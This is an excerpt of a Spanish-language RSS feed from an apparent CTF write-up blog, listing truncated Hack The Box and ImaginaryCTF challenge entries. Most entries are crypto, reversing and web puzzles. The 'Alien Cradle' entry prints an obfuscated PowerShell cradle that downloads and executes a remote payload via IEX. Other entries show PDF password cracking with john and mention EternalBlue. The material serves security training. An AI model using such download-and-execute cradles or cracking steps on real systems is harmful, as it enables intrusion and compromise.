convertirnos en root porque pertenecemos al grupo sudo. Para obtener la flag root.txt, tenemos que hacer una copia completa de un dispositivo de almacenamiento USB</description></item><item><title>Blue</title><link>https://7rocky.github.io/htb/blue/</link><pubDate>Sat, 13 Jan 2018 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/blue/</guid><description>Hack The Box. Windows. Máquina fácil. Esta máquina expone SMB versión 1, siendo vulnerable a EternalBlue. Una vez que el exploit está completado, tenemos acceso como Administrator</description></item><item><title>Lame</title><link>https://7rocky.github.io/htb/lame/</link><pubDate>Sun, 18 Jun 2017 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/htb/lame/</guid><description>Hack The Box. Linux. Máquina fácil. Esta máquina expone versiones vulnerables de servicios FTP y SMB. El servicio SMB es explotable y deriva en RCE como root</description></item><item><title>0ld is g0ld</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/0ld-is-g0ld/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/0ld-is-g0ld/</guid><description>Se nos proporciona un archivo PDF llamado 0ld is g0ld.pdf, pero está protegido con contraseña
Para obtener la contraseña, podemos usar pdf2john para extraer nu hash y pasárselo a john para romperlo con un ataque de diccionario usando rockyou.txt:
$ pdf2john 0ld\ is\ g0ld.pdf | tee hash 0ld is g0ld.pdf:$pdf$4*4*128*-1060*1*16*5c8f37d2a45eb64e9dbbf71ca3e86861*32*9cba5cfb1c536f1384bba7458aae3f8100000000000000000000000000000000*32*702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64]) Cost 1 (revision) is 4 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status jumanji69 (0ld is g0ld.</description></item><item><title>0xBOverchunked</title><link>https://7rocky.github.io/ctf/htb-challenges/web/0xboverchunked/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/0xboverchunked/</guid><description>Se nos proporciona esta página web:
Esta página web nos permite buscar algunos juegos por ID:
Análisis del código fuente También se nos proporciona el código fuente en PHP del servidor. De acuerdo a db/init.sql, debemos leer el contenido del ID 6 para obtener la flag, pero no podemos hacerlo directamente:
CREATE TABLE posts ( id INTEGER PRIMARY KEY, gamename TEXT NOT NULL, gamedesc TEXT NOT NULL, image BLOB NOT NULL ); INSERT INTO posts (gamename, gamedesc, image) VALUES ('Pikachu', 'A small, yellow, mouse-like creature with a lightning bolt-shaped tail.</description></item><item><title>400curves</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/400curves/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/400curves/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Util.number import inverse, bytes_to_long import socketserver import signal from secret import FLAG a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff E = {'a': a, 'b': b, 'p': p} class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def recieveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def add(P, Q, E): if (P == (0, 0)): return Q elif (Q == (0, 0)): return P else: Ea, Ep = E['a'], E['p'] x1, y1 = P x2, y2 = Q if ((x1 == x2) &amp;amp; (y1 == -y2)): return ((0, 0)) else: if (P !</description></item><item><title>5x5 Crypto</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/5x5-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/5x5-crypto/</guid><description>Se nos proporciona este conjunto de números y caracteres:
1-3,4-4,2-1,3-1,1-5,1-1,4-2,3-3,{,4-4,2-3,4-5,3-2,1-2,4-3,_,4-5,3-5,} Y se nos dice que el método de cifrado usa una tabla 5x5 con todas las letras del alfabeto en orden. Si hacemos una búsqueda rápida, llegamos al Cuadrado de Polibio, que es este:
A B C D E F G H I/J K L M N O P Q R S T U V W X Y Z Podemos tomar cada par i-j y tomar la letra correspondiente al hacer coincidir fila y columna.</description></item><item><title>A little something to get you started</title><link>https://7rocky.github.io/ctf/hacker101ctf/a-little-something-to-get-you-started/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/hacker101ctf/a-little-something-to-get-you-started/</guid><description>Tenemos una simple página web como esta:
Podemos leer el código HTML de la página, que es el siguiente:
Hay una imagen llamada background.png, Pero no observamos nada en la página web. Podemos acceder a ella utilizando curl:
$ curl http://35.190.155.168/9a968e7787/background.png ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$ Y obtenemos la flag.</description></item><item><title>A Puzzle in Seven Parts</title><link>https://7rocky.github.io/ctf/imaginaryctf/a-puzzle-in-seven-parts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/a-puzzle-in-seven-parts/</guid><description>Se nos proporciona esta cadena de texto:
AbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDEFGaBCdefgAbCDeFGABCdeFGAbCDeFGABCdefgaBCdeFGAbCDeFGABCdefgABCDEFGAbCDeFGAbCDeFGAbCDeFGABCDEFGAbCDEFGaBCdeFGaBCdeFGAbcDEFGAbCDeFGAbCDEFGAbCDeFGABCdefgAbCDeFGABcDEfGABCdefgaBCdefgAbCDeFGAbCDeFGABCDefGABCDEFgAbCDeFGABCdEFGAbCDEFGaBCdefgAbCDEFGABCDefGAbCDEFGAbcDEFgAbCDeFGAbCDeFGABCdefgABCdefgAbCDEFGaBCdefgaBCdeFGAbCDeFGaBCdeFGAbcDEFGAbCDEFGABCdEFGAbCDeFGABcDEfGAbCDEFGAbcDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDeFGAbCDeFGAbCDeFGABCdefgABCDefGAbCDeFGAbCDEFGabCDEFGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGABCDEFGAbCDeFGABCdefgaBCdeFGaBCDEfGAbCDeFGAbCDEFGaBCdeFGABCdEFGAbCDeFGABCDEFGAbCDeFGABCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCdEFGAbCDEFGaBCdeFGABCDefGABcDEfGaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGABCdefgAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDeFGABCDefGaBCdeFGaBCDEfGABCDefGABCDEFgaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGAbCDeFGaBCdeFGABCdefgaBCdeFGAbcDEFGAbCDeFGABCDEFGAbCDeFGABCDefGAbCDEFGabCDEFGAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgAbCDEFGABCDEFGAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbcDEFgAbCDeFGABcDEfGAbCDeFGABCdefgAbCDeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGaBCdeFGAbCDeFGABCDEFGAbCDEFGABCDefGaBCdeFGAbCDeFGAbCDEFGaBCdeFGAbCDEFGabCDEFGaBCdeFGaBCDEfGAbCDeFGAbCDEFGAbCDEFGAbcDEFgABCDefGABCDefGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgABCDefGAbCDeFGABCdeFGAbCDeFGAbCDEFGaBCdeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgaBCdeFGaBCDEfGABCDefGaBCdefgAbCDeFGaBCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDEFGabCDEFGAbCDeFGABCdefgAbCDeFGABCdefgaBCdeFGAbcDEFGaBCdeFGAbCDEFGAbCDeFGABCdefgAbCDEFGabCDEFGABCDefGABCdeFGAbCDeFGABCdefgaBCdeFGaBCDEfGaBCdeFGAbCDEFGABCdefgABCDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDEFGabCDEFGAbCDEFGABCDefGABCDefGaBCdefgAbCDeFGAbCDeFGABCDefGaBCdefgAbCDeFGABCdeFGABCdefgABCdeFGAbCDeFGABCDefGAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDEFGABCdEFGAbCDeFGABCDefGaBCdeFGAbCDeFGABCdefgABCDEFgAbCDeFGABCdefgAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDeFGABCdEFGAbCDEFGaBCdefgaBCdeFGaBCDEfGABCDefGaBCdefgABCdefgABCDEFgaBCdeFGAbCDeFGAbCDeFGABcDEfGAbCDEFGAbcDEFGAbCDEFGaBCdeFGAbCDeFGaBCdeFGAbCDeFGABcDEfGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDeFGABCdEFGAbCDeFGAbCDEFGaBCdeFGABCdefgABCDefGaBCdefgAbCDEFGAbcdEFGAbCDeFGAbCDeFGABCDefGABCDEFgABCDefGaBCdefgaBCdeFGABCdeFGAbCDeFGaBCdefgAbCDEFGabCDEFGABCdefgaBCdeFGAbCDeFGABCdefgAbCDeFGABcDEfGAbCDEFGAbcDEFgAbCDeFGABCdEFGAbCDeFGABCDefGAbCDeFGABCdEFGaBCdeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCDefGAbCDeFGAbCDeFGAbCDEFGAbcDEFgaBCdeFGABcDEfGAbCDeFGAbCDeFGaBCdeFGaBCDEfGaBCdeFGaBCdeFGABCDefGABCDEFgABCDefGaBCDEfG Display de siete segmentos Como sugiere el reto, el texto anterior debe estar relacionado con un display de siete segmentos:
Por ejemplo, las primeras 7 letras son AbCDeFG, que forman un 5 (las letras mayúsculas están encendidas y las letras minúsculas están apagadas). Usemos Python para dividir toda la cadena en trozos de 7 letras y eliminar las letras minúsculas:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; import re &amp;gt;&amp;gt;&amp;gt; m = 'AbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDEFGaBCdefgAbCDeFGABCdeFGAbCDeFGABCdefgaBCdeFGAbCDeFGABCdefgABCDEFGAbCDeFGAbCDeFGAbCDeFGABCDEFGAbCDEFGaBCdeFGaBCdeFGAbcDEFGAbCDeFGAbCDEFGAbCDeFGABCdefgAbCDeFGABcDEfGABCdefgaBCdefgAbCDeFGAbCDeFGABCDefGABCDEFgAbCDeFGABCdEFGAbCDEFGaBCdefgAbCDEFGABCDefGAbCDEFGAbcDEFgAbCDeFGAbCDeFGABCdefgABCdefgAbCDEFGaBCdefgaBCdeFGAbCDeFGaBCdeFGAbcDEFGAbCDEFGABCdEFGAbCDeFGABcDEfGAbCDEFGAbcDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDeFGAbCDeFGAbCDeFGABCdefgABCDefGAbCDeFGAbCDEFGabCDEFGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGABCDEFGAbCDeFGABCdefgaBCdeFGaBCDEfGAbCDeFGAbCDEFGaBCdeFGABCdEFGAbCDeFGABCDEFGAbCDeFGABCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCdEFGAbCDEFGaBCdeFGABCDefGABcDEfGaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGABCdefgAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDeFGABCDefGaBCdeFGaBCDEfGABCDefGABCDEFgaBCdeFGABCdEFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbCDEFGABCdEFGaBCdeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGAbCDeFGaBCdeFGABCdefgaBCdeFGAbcDEFGAbCDeFGABCDEFGAbCDeFGABCDefGAbCDEFGabCDEFGAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgAbCDEFGABCDEFGAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDEFGAbcDEFgAbCDeFGABcDEfGAbCDeFGABCdefgAbCDeFGAbCDEFGAbCDeFGAbCDEFGAbCDEFGaBCdeFGAbCDeFGABCDEFGAbCDEFGABCDefGaBCdeFGAbCDeFGAbCDEFGaBCdeFGAbCDEFGabCDEFGaBCdeFGaBCDEfGAbCDeFGAbCDEFGAbCDEFGAbcDEFgABCDefGABCDefGAbCDeFGaBCdeFGABCDefGaBCdefgAbCDeFGABCdEFGABCdefgABCDefGAbCDeFGABCdeFGAbCDeFGAbCDEFGaBCdeFGABCdEFGABCdefgAbCDeFGAbCDeFGaBCdefgAbCDEFGAbcDEFgAbCDEFGAbcDEFgAbCDeFGAbCDEFGAbCDEFGABcDEfGaBCdeFGABCdefgaBCdeFGaBCDEfGABCDefGaBCdefgAbCDeFGaBCdeFGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDEFGabCDEFGAbCDeFGABCdefgAbCDeFGABCdefgaBCdeFGAbcDEFGaBCdeFGAbCDEFGAbCDeFGABCdefgAbCDEFGabCDEFGABCDefGABCdeFGAbCDeFGABCdefgaBCdeFGaBCDEfGaBCdeFGAbCDEFGABCdefgABCDEFgaBCdeFGABCdEFGAbCDeFGAbCDEFGAbCDEFGabCDEFGAbCDEFGABCDefGABCDefGaBCdefgAbCDeFGAbCDeFGABCDefGaBCdefgAbCDeFGABCdeFGABCdefgABCdeFGAbCDeFGABCDefGAbCDEFGAbcDEFgAbCDEFGaBCdeFGAbCDEFGABCdEFGAbCDeFGABCDefGaBCdeFGAbCDeFGABCdefgABCDEFgAbCDeFGABCdefgAbCDeFGaBCdeFGAbCDeFGAbCDeFGAbCDeFGABCdEFGAbCDEFGaBCdefgaBCdeFGaBCDEfGABCDefGaBCdefgABCdefgABCDEFgaBCdeFGAbCDeFGAbCDeFGABcDEfGAbCDEFGAbcDEFGAbCDEFGaBCdeFGAbCDeFGaBCdeFGAbCDeFGABcDEfGAbCDeFGaBCdeFGaBCdeFGAbCDEFGAbCDeFGABCdEFGAbCDeFGAbCDEFGaBCdeFGABCdefgABCDefGaBCdefgAbCDEFGAbcdEFGAbCDeFGAbCDeFGABCDefGABCDEFgABCDefGaBCdefgaBCdeFGABCdeFGAbCDeFGaBCdefgAbCDEFGabCDEFGABCdefgaBCdeFGAbCDeFGABCdefgAbCDeFGABcDEfGAbCDEFGAbcDEFgAbCDeFGABCdEFGAbCDeFGABCDefGAbCDeFGABCdEFGaBCdeFGaBCdeFGaBCdeFGAbCDEFGaBCdeFGABCDefGAbCDeFGAbCDeFGAbCDEFGAbcDEFgaBCdeFGABcDEfGAbCDeFGAbCDeFGaBCdeFGaBCDEfGaBCdeFGaBCdeFGABCDefGABCDEFgABCDefGaBCDEfG' &amp;gt;&amp;gt;&amp;gt; ms = [m[i : i + 7] for i in range(0, len(m), 7)] &amp;gt;&amp;gt;&amp;gt; ms = [re.</description></item><item><title>A Very Good Place to Start</title><link>https://7rocky.github.io/ctf/imaginaryctf/a-very-good-place-to-start/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/a-very-good-place-to-start/</guid><description>Se nos proporciona un binario de 64 bits llamado start:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Ingeniería inversa Si usamos Ghidra para extraer el código fuente en C descompilado, veremos la siguiente función main:
int main() { int ret; char name[64]; FILE *fp; uint i; setbuf(stdout, NULL); setbuf(stdin, NULL); fp = fopen("./flag.txt", "r"); __isoc99_fscanf(fp, "%s", flag); printf("What\'s your name? "); fgets(name, 128, stdin); i = 0; do { if (63 &amp;lt; i) { LAB_00401240: ret = strcmp("</description></item><item><title>AAAA</title><link>https://7rocky.github.io/ctf/imaginaryctf/aaaa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/aaaa/</guid><description>Se nos proporciona el dominio number6challenge.imaginaryctf.org.
Enumeración por DNS Como el reto se llama &amp;ldquo;AAAA&amp;rdquo;, podemos pensar en el registro de tipo AAAA de DNS (más información aquí). Para comprobarlo, podemos usar dig:
$ dig number6challenge.imaginaryctf.org AAAA ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.6 &amp;lt;&amp;lt;&amp;gt;&amp;gt; number6challenge.imaginaryctf.org AAAA ;; global options: +cmd ;; Got answer: ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 14021 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;number6challenge.</description></item><item><title>AbraCryptabra</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/abracryptabra/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/abracryptabra/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Util.number import long_to_bytes, GCD from Crypto.Util.Padding import pad from Crypto.Cipher import AES import hashlib import random import socketserver import signal from secret import FLAG LOGO = (""" ╭━━━┳╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╭╮ ┃╭━╮┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰╮╱╱┃┃ ┃┃╱┃┃╰━┳━┳━━┳━━┳━┳╮╱╭┳━┻╮╭╋━━┫╰━┳━┳━━╮ ┃╰━╯┃╭╮┃╭┫╭╮┃╭━┫╭┫┃╱┃┃╭╮┃┃┃╭╮┃╭╮┃╭┫╭╮┃ ┃╭━╮┃╰╯┃┃┃╭╮┃╰━┫┃┃╰━╯┃╰╯┃╰┫╭╮┃╰╯┃┃┃╭╮┃ ╰╯╱╰┻━━┻╯╰╯╰┻━━┻╯╰━╮╭┫╭━┻━┻╯╰┻━━┻╯╰╯╰╯ ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃┃┃ ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯╰╯\n""") class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def bytes_to_bits(input): return ''.</description></item><item><title>AbuseHumanDB</title><link>https://7rocky.github.io/ctf/htb-challenges/web/abusehumandb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/abusehumandb/</guid><description>Tenemos una página web que nos permite introducir una URL. Posteriormente, un bot accederá:
Análisis de código fuente En el código fuente tenemos una aplicación en Express JS. Este es el archivo route/index.js:
const bot = require('../bot') const path = require('path') const express = require('express') const router = express.Router() const response = data =&amp;gt; ({ message: data }) const isLocalhost = req =&amp;gt; (req.ip == '127.0.0.1' &amp;amp;&amp;amp; req.headers.host == '127.0.0.1:1337' ?</description></item><item><title>aes</title><link>https://7rocky.github.io/ctf/imaginaryctf/aes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/aes/</guid><description>Se nos proporciona esta salida:
Python 3.8.10 (default, Mar 15 2022, 12:22:08) [GCC 9.4.0] on linux Type "help", "copyright", "credits" or "license" for more information. &amp;gt;&amp;gt;&amp;gt; import random &amp;gt;&amp;gt;&amp;gt; from Crypto.Cipher import AES &amp;gt;&amp;gt;&amp;gt; key = random.choice(open("rockyou.txt", "rb").readlines()[:10000]).strip() &amp;gt;&amp;gt;&amp;gt; key = key.zfill(16) &amp;gt;&amp;gt;&amp;gt; cipher = AES.new(key, AES.MODE_ECB) &amp;gt;&amp;gt;&amp;gt; cipher.encrypt(open("flag.txt", "rb").read().zfill(48)) b"\xd6\x19O\xbeA\xb0\x15\x87\x0e\xc7\xc4\xc1\xe9h\xd8\xe6\xc6\x95\x82\xaa#\x91\xdb2l\xfa\xf7\xe1C\xb8\x11\x04\x82p\xe5\x9e\xb1\x0c*\xcc[('\x0f\xcc\xa7W\xff" Se trata del resultado de una consola de Python REPL. Lo que hace es coger una contraseña aleatoria de rockyou.</description></item><item><title>AESWCM</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/aeswcm/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/aeswcm/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Util.Padding import pad from Crypto.Cipher import AES import os import random from secret import FLAG KEY = os.urandom(16) IV = os.urandom(16) class AESWCM: def __init__(self, key): self.key = key self.cipher = AES.new(self.key, AES.MODE_ECB) self.BLOCK_SIZE = 16 def pad(self, pt): if len(pt) % self.BLOCK_SIZE != 0: pt = pad(pt, self.BLOCK_SIZE) return pt def blockify(self, message): return [ message[i:i + self.BLOCK_SIZE] for i in range(0, len(message), self.</description></item><item><title>AESWCM</title><link>https://7rocky.github.io/ctf/other/htb-unictf/aeswcm/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/aeswcm/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Util.Padding import pad from Crypto.Cipher import AES import os import random from secret import FLAG KEY = os.urandom(16) IV = os.urandom(16) class AESWCM: def __init__(self, key): self.key = key self.cipher = AES.new(self.key, AES.MODE_ECB) self.BLOCK_SIZE = 16 def pad(self, pt): if len(pt) % self.BLOCK_SIZE != 0: pt = pad(pt, self.BLOCK_SIZE) return pt def blockify(self, message): return [ message[i:i + self.BLOCK_SIZE] for i in range(0, len(message), self.</description></item><item><title>AHS512</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/ahs512/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/ahs512/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from secret import FLAG from hashlib import sha512 import socketserver import signal from random import randint WELCOME = """ **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** "</description></item><item><title>AHS512</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/ahs512/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/ahs512/</guid><description>Se nos proporciona el código fuente en Python del servidor:
from secret import FLAG from hashlib import sha512 import socketserver import signal from random import randint WELCOME = """ **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** "</description></item><item><title>Alien Cradle</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/alien-cradle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/alien-cradle/</guid><description>Se nos proporciona un script en PowerShell llamado cradle.ps1:
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); Desofuscación de PowerShell Está un poco ofuscado, vamos a formatearlo un poco:
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth') { exit }; $w = New-Object net.</description></item><item><title>Alien Saboteaur</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/alien-saboteaur/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/alien-saboteaur/</guid><description>Se nos proporciona un archivo binario llamado vm y un programa llamado bin:
$ file * bin: data vm: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=10fb238b19d3a82b46536b51e47396525086a09c, for GNU/Linux 3.2.0, not stripped Configuración del entorno El binario necesita una versión reciente de Glibc para funcionar:
$ ./vm ./vm: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./vm) Para resolver este problema, podemos ejecutar Ubuntu 22.04 en un contenedor de Docker y tomar la librería y el cargador para parchear el binario:</description></item><item><title>Alien Saboteaur</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/alien-saboteaur/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/alien-saboteaur/</guid><description>Se nos proporciona un archivo binario llamado vm y un programa llamado bin:
$ file * bin: data vm: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=10fb238b19d3a82b46536b51e47396525086a09c, for GNU/Linux 3.2.0, not stripped Configuración del entorno El binario necesita una versión reciente de Glibc para funcionar:
$ ./vm ./vm: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./vm) Para resolver este problema, podemos ejecutar Ubuntu 22.04 en un contenedor de Docker y tomar la librería y el cargador para parchear el binario:</description></item><item><title>Almost SSTI</title><link>https://7rocky.github.io/ctf/imaginaryctf/almost-ssti/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/almost-ssti/</guid><description>Se nos proporciona una página web para analizar. La página principal muestra el código fuente del servidor:
#!/usr/bin/env python3 from flask import Flask, render_template_string, request, Response app = Flask(__name__) @app.route('/') def index(): return Response(open(__file__).read(), mimetype='text/plain') @app.route('/ssti') def ssti(): query = request.args['query'] if len(query) &amp;gt; 2: return "Too long!" return render_template_string(query) app.run('0.0.0.0', 3002, debug=True) Se trata de una página web hecha en Flask (Python). Algo interesante es que el modo debug está activado.</description></item><item><title>Amidst Us</title><link>https://7rocky.github.io/ctf/htb-challenges/web/amidst-us/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/amidst-us/</guid><description>Tenemos la siguiente página web, que simula el juego Among Us:
Existe un botón para seleccionar un color con un color picker:
Si analizamos el código fuente, tenemos una aplicación en Flask (en Python). Este es application/blueprints/routes.py:
from flask import Blueprint, request, render_template, abort from application.util import make_alpha web = Blueprint('web', __name__) api = Blueprint('api', __name__) @web.route('/') def index(): return render_template('index.html') @api.route('/alphafy', methods=['POST']) def alphafy(): if not request.is_json or 'image' not in request.</description></item><item><title>Anchored</title><link>https://7rocky.github.io/ctf/htb-challenges/mobile/anchored/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/mobile/anchored/</guid><description>Se nos proporciona un archivo APK (Manager.apk) y un archivo README.txt:
1. Install this application in an API Level 29 or earlier (i.e. Android 10.0 (Google Play)). 1. Install this application in a non-rooted device (i.e. In Android Studio AVD Manager select an image that includes (Google Play)). Ingeniería inversa Lo primero que podemos hacer es descompilar el archivo APK y leer código fuente en Java.
Descomilación de APK Si cargamos el APK en www.</description></item><item><title>Ancient Encodings</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/ancient-encodings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/ancient-encodings/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from Crypto.Util.number import bytes_to_long from base64 import b64encode from secret import FLAG def encode(message): return hex(bytes_to_long(b64encode(message))) def main(): encoded_flag = encode(FLAG) with open("output.txt", "w") as f: f.write(encoded_flag) if __name__ == "__main__": main() Y también tenemos la salida del script:
0x53465243657a51784d56383361444e664d32356a4d475178626a6c664e44497a5832677a4d6a4e664e7a42664e5463306558303d Análisis de código fuente El programa coge la flag y usa encode:
